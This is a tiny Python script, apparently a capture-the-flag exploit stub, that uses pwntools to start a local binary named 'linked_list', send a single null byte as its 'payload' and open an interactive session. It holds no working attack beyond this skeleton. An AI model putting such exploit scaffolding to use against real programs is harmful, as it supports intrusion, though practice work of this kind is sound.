from pwn import *
p = process('./linked_list')

raw_input()
pay ='\x00'
p.send(pay)

p.interactive()
